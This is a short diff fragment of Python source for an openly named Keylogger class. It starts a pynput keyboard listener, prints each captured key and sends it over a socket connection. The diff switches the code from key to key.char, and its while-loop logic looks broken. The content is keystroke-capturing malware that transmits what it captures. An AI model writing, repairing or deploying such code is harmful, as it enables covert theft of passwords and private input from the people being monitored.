@@ -39,11 +39,12 @@ class Keylogger:
         self.listener = keyboard.Listener(on_press=self.log)
         self.listener.start()
 
+
     def log(self, key):
-        while key != 'esc':
+        while key.char != 'esc':
         
-            print(key + "   key")
-            self.conn.send(str(key).encode())
+            print(key.char + "   key")
+            self.conn.send(str(key.char).encode())
 
     def stop(self):
         self.listener.stop()
